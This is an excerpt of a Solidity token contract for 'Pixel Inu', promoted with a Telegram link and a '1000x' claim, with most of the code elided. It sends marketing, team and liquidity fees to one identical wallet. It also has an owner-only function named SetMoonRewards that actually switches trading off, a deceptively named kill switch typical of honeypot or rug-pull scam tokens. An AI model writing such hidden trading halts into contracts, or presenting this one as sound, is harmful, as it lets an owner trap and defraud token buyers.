/**
https://t.me/Pixelinubsc

Pixel Inu - An alpha team bringin 1000x
...
contract PixelInu is Context, IERC20, Ownable {
    ...
    address payable public marketingAddress =
        payable(0xa0F3ad2c7F76f255d2C43f0D089fA784F241eC4d); // Marketing Address
        
    address payable public teamAddress =
        payable(0xa0F3ad2c7F76f255d2C43f0D089fA784F241eC4d); // Team Address
        
    address payable public liquidityAddress =
        payable(0xa0F3ad2c7F76f255d2C43f0D089fA784F241eC4d); // Liquidity Address
    ...
    function SetMoonRewards() external onlyOwner {
        tradingActive = false;
    }
